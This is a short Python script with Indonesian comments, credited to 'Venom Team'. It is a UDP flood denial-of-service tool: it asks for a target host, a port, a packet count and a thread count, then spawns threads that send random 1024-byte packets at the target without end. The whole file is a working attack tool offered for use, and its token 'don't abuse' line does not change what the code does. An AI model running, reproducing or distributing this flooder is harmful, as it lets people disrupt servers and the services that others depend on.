#!/usr/bin/env python3
#Yahahahahaha Hapus Credit/rename gw doain tobat lu
#semoga harimu menyenangkan

import random
import socket
import threading
import os

os.system("clear")

print("AUTHOR : L")
print("CREDIT : L")
print("TEAM : Venom Team")
print("HELP : homemade")
print("JANGAN ABUSE")
ip = str(input(" Ip/Hostnya : "))
port = int(input(" Port Target : "))
times = int(input(" Paket :"))
threads = int(input(" Threads :"))

def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" Foerza Bergerak Menuju Masa Sukses")
    except:
      print("Server Dah Mati")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
